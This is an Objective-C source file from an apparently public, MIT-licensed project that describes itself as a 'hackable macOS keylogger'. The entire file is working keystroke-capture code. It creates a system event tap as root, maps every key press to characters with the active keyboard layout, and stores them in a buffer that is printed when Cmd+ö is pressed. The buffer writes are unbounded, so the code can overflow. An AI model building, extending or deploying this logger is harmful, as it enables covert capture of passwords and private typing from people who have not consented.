/*   _                                       _
 *  | | https://github.com/NewDawn0/logged  | |
 *  | |   / _ \   / _` |  / _` |  / _ \  / _` |
 *  | |_ | (_) | | (_| | | (_| | |  __/ | (_| |
 *  |___| \___/   \__, |  \__, |  \___|  \__,_|
 *                |___/   |___/
 *
 *  @ATHOR: NewDawn0
 *  @CONTRIBUTORS: -
 *  @LICENSE: MIT
 *  @COPYRIGHT: ©Copyright NewDawn0 (2023)
 *  @DESC: A hackable macOS keylogger
 *
 *  MIT License
 *
 *  Copyright (c) 2023 NewDawn0
 *
 *  Permission is hereby granted, free of charge, to any person obtaining a copy
 *  of this software and associated documentation files (the "Software"), to deal
 *  in the Software without restriction, including without limitation the rights
 *  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 *  copies of the Software, and to permit persons to whom the Software is
 *  furnished to do so, subject to the following conditions:
 *
 *  The above copyright notice and this permission notice shall be included in all
 *  copies or substantial portions of the Software.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 *  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 *  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 *  SOFTWARE.
 *
 *  File: main.m
 *  Decs: Main file
*/

// Imports
#import <string.h>
#import <Carbon/Carbon.h>
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>

#define bufMax 40000

// Create event tap
static CFMachPortRef eventTap = NULL;
static char buf[bufMax] = {0};
static int bufIndex = 0;

// Colourful messages
typedef struct {
    const NSString* red;
    const NSString* blue;
    const NSString* reset;
} Colours;
const static Colours colours = {
    @"\x1b[31;1m",
    @"\x1b[34;1m",
    @"\x1b[0m",
};

// Fn decl
NSString* keyCodeToString(CGEventRef event, CGEventType type);
NSMutableString* extractKeyModifiers(CGEventRef event);
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *ref);
void moddump();

/* getKey: Map the keycode to a char
 * @PARAM CGEventRef: event
 * @PARAM:CGEventType: type
 * @RVal NSString* */
NSString* keyCodeToString(CGEventRef event, CGEventType type) {
    // init return val, status, keyCode &layout
    NSString* keyChar = nil;
    OSStatus status = !noErr;
    CGKeyCode keyCode = 0;
    CFDataRef layoutData = NULL;
    const UCKeyboardLayout* layout = NULL;
    // Key setup
    UInt16 keyAction = 0;
    UInt32 modifierState = 0;
    UInt32 deadKeyState = 0;
    // Set char lenghts
    UniCharCount maxStringLength = 255;
    UniCharCount actualStringLength = 0;
    UniChar unicodeString[maxStringLength];
    memset(unicodeString, 0x0, sizeof(unicodeString));
    // set return val, status, keyCode &layout
    keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    // get layout
    layoutData = (CFDataRef)TISGetInputSourceProperty(TISCopyCurrentKeyboardInputSource(), kTISPropertyUnicodeKeyLayoutData);
    if(layoutData == NULL) { goto stop; }
    layout = (const UCKeyboardLayout*)CFDataGetBytePtr(layoutData);
    if(layout == NULL) { goto stop; }
    if(kCGEventKeyDown == type) {
        keyAction = kUCKeyActionDown;
    }
    // translate code to key using layout
    status = UCKeyTranslate(layout, keyCode, keyAction, modifierState, LMGetKbdType(), 0, &deadKeyState, maxStringLength, &actualStringLength, unicodeString);
    if ((status != noErr) || (actualStringLength == 0)) { goto stop; }
    //init string
    keyChar = [[NSString stringWithCharacters:unicodeString length:(NSUInteger)actualStringLength] lowercaseString];
stop:
    return keyChar;
}

/* getMods: Get the modifier keys
 * @PARAM CGEventRef: events
 * @RVal NSMutableString* */
NSMutableString* extractKeyModifiers(CGEventRef event) {
    // Setup modifiers, flags
    NSMutableString* keyModifiers = nil;
    CGEventFlags flags = 0;
    keyModifiers = [NSMutableString string];
    flags = CGEventGetFlags(event);
    // Handlers: control
    if(!!(flags & kCGEventFlagMaskControl) == YES) {
        [keyModifiers appendString:@"ctrl"];
    }
    // Handlers: alt
    if(!!(flags & kCGEventFlagMaskAlternate) == YES) {
        [keyModifiers appendString:@"alt"];
    }
    // Handlers: command
    if(!!(flags & kCGEventFlagMaskCommand) == YES) {
        [keyModifiers appendString:@"cmd"];
    }
    // Handlers: shift
    if(!!(flags & kCGEventFlagMaskShift) == YES) {
        [keyModifiers appendString:@"shift"];
    }
    // Handlers: lock
    if(!!(flags & kCGEventFlagMaskAlphaShift) == YES) {
        [keyModifiers appendString:@"caps"];
    }
    return keyModifiers;
}

/* callback: Function which runs on callback
 * @PARAM CGEventTapProxy: proxy
 * @PARAM CGEventType: type
 * @PARAM CGEventRef: event
 * @PARAM void*: ref 
 * @RVal CGEventRef */
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *ref) {
    // Set vars
    NSMutableString* keyMods = nil;
    // match type
    switch(type) {
        // Ignore mouse
        case kCGEventLeftMouseDown:
            break;
        case kCGEventLeftMouseUp:
            break;
        case kCGEventRightMouseDown:
            break;
        case kCGEventRightMouseUp:
            break;
        case kCGEventLeftMouseDragged:
            break;
        case kCGEventRightMouseDragged:
            break;
        // Handle keys
        case kCGEventKeyDown:
            keyMods = extractKeyModifiers(event);
            break;
        case kCGEventKeyUp:
            break;
        // event tap timeout
        case kCGEventTapDisabledByTimeout:
            CGEventTapEnable(eventTap, true);
            printf("%sErr ::%s Event tap timed out -> restarting tap\n", colours.red.UTF8String, colours.reset.UTF8String);
            return event;
        default:
            printf("%sUnknown%s\n", colours.red.UTF8String, colours.reset.UTF8String);
    }
    // Get keycode
    if ((kCGEventKeyDown == type) || (kCGEventKeyUp == type)) {
        // Hanle special keys
        // shift, ctrl, alt, cmd, caps
        if ([keyMods rangeOfString:@"cmd"].location != NSNotFound && [keyCodeToString(event, type) isEqualToString:@"ö"]) {
            moddump();
        }
        // handle modifiers
        if ([keyMods rangeOfString:@"shift"].location != NSNotFound || [keyMods rangeOfString:@"caps"].location != NSNotFound) {
            sprintf(buf + bufIndex, "%s", [[keyCodeToString(event, type) uppercaseString] UTF8String]);
        } else if ([keyMods rangeOfString:@"ctrl"].location != NSNotFound) {
        } else if ([keyMods rangeOfString:@"alt"].location != NSNotFound) {
        } else if ([keyMods rangeOfString:@"cmd"].location != NSNotFound) {
        } else {
            sprintf(buf + bufIndex, "%s", [keyCodeToString(event, type) UTF8String]);
        }
        bufIndex += strlen(buf + bufIndex);
    }
    // return
    return event;
}

/* moddump: dump buffer and exec */
void moddump() {
    printf("%s\n", buf);
    bufIndex = 0;
    memset(buf, 0, bufMax);
}

/* main: The main function 
 * @PARAM int: argc 
 * @PARAM char**: argv
 * @RVal int */
void get() {
    // event mask + loop
    CGEventMask eventMask = 0;
    CFRunLoopSourceRef runLoopSource = NULL;
    //pool
    @autoreleasepool {
        // check for root
        if(geteuid() != 0) {
            printf("%sErr ::%s Service must be run as root\n", colours.red.UTF8String, colours.reset.UTF8String);
            goto stop;
        }
        printf("%sLogged ::%s logging...\n", colours.blue.UTF8String, colours.reset.UTF8String);
        // init event tap and mask
        eventMask = CGEventMaskBit(kCGEventKeyDown);
        eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, eventCallback, NULL);
        if(eventTap == NULL) {
            printf("%sErr ::%s failed to create event tap\n", colours.red.UTF8String, colours.reset.UTF8String);
            goto stop;
        }
        // setup runloop
        runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
        CGEventTapEnable(eventTap, true);
        // running
        CFRunLoopRun();
    }
stop:
    // handle tap
    if(eventTap != NULL) {
        CFRelease(eventTap);
        eventTap = NULL;
    }
    // handle loop 
    if(runLoopSource != NULL) {
        CFRelease(runLoopSource);
        runLoopSource = NULL;
    }
}
